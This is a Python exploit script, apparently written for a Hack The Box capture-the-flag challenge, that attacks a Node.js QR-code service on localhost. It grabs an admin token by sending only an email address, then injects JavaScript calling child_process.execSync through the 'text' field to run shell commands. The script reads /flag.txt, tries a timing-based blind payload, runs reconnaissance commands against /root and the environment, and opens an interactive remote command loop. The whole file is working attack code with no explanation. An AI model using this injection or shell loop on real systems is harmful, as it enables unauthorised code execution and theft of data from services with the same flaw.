import requests
import json
import time

server = "localhost"
port = 5000
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

headers = {"Content-Type": "application/json"}
data = {"email": "admin@hackthebox.com"}

print("Request auth token...")
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

print(f"Token granted {token[:50]}...")

headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}

def get_flag():
    print("\n[+] Trying to read /flag.txt")
    
    user_input = "cat /flag.txt"
    user_input = user_input.replace("'", '"')
    
    payload = { 
        "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
    }
    
    print(f"[+] Send payload: {payload}")
    
    try:
        response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
        print(f"[+] Code status: {response.status_code}")
        
        if response.status_code == 403:
            output = response.json()['message'].split("The input \"")[1][:-2]
            print(f"\n[+] Your flag: {output}")
            return output
        else:
            print(f"[-] Unexpected response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def test_system():
    test_commands = [
        "whoami"
    ]
    
    for cmd in test_commands:
        print(f"\n[+] Testing command: {cmd}")
        user_input = cmd.replace("'", '"')
        
        #payload = { 
        #    "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
        #}

        payload = { 
            "text": "'+(()=>{const f=require('fs');try{if(f.readFileSync('flag.txt','utf8').charAt(0)=='H'){const s=Date.now();while(Date.now()-s<10000){}}}catch(e){}return''})()+`'`, statusCode: 403})//"
        }
        print(f"Testing char H for 5 sec.")
        try:
            response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
            
            if response.status_code == 403:
                output = response.json()['message'].split("The input \"")[1][:-2]
                print(f"Result: {output}")
            else:
                print(f"Status: {response.status_code}, Response: {response.text[:100]}...")
                
        except Exception as e:
            print(f"Ошибка: {e}")

def interactive_mode():
    print("\n[+] Enter interactive. Input your command or 'exit'")
    
    while True:
        user_input = input("> ")
        
        if user_input.lower() in ['exit', 'quit', 'q']:
            print("[+] Exit interactive")
            break
        
        if user_input.strip() == "":
            continue
        
        if user_input.strip() == "getflag":
            get_flag()
            continue
            
        user_input = user_input.replace("'", '"')
        payload = { 
            "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
        }
        
        print(f"[DEBUG] Payload: {payload}")
        
        try:
            response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
            print(f"Code status {response.status_code}")
            
            if response.status_code == 403:
                output = response.json()['message'].split("The input \"")[1][:-2]
                print(output)
            else:
                print(f"Response: {response.text[:200]}...")
                
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt:
            print("\n[+] Keyboard interrupt")
            break

if __name__ == "__main__":
    print("=" * 50)
    print("RCE exploitation")
    print("=" * 50)

    print("\n[+] Cheching availavle methods..")
    test_system()
    
    flag = get_flag()
    
    if flag:
        print(f"\n[+] Your flag is: {flag}")
    else:
        print("\n[-] Cant reach flag")
        print("[+] Alternative commands...")
        
        alternative_commands = [
            "find / -name '*flag*' -type f 2>/dev/null | head -10",
            "ls -la /home/",
            "ls -la /root/",
            "env | grep -i flag",
            "cat flag.txt 2>/dev/null || echo 'Can't find'"
        ]
        
        for cmd in alternative_commands:
            print(f"\n[+] Trying: {cmd}")
            user_input = cmd.replace("'", '"')
            
            payload = { 
                "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
            }
            
            try:
                response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
                
                if response.status_code == 403:
                    output = response.json()['message'].split("The input \"")[1][:-2]
                    print(f"Result: {output}")
                else:
                    print(f"Status: {response.status_code}")
                    
            except Exception as e:
                print(f"Error: {e}")
    
    choice = input("\n[+] Interactive regime? (y/n): ")
    if choice.lower() in ['y', 'yes']:
        interactive_mode()
    
    print("\n[+] Complete")
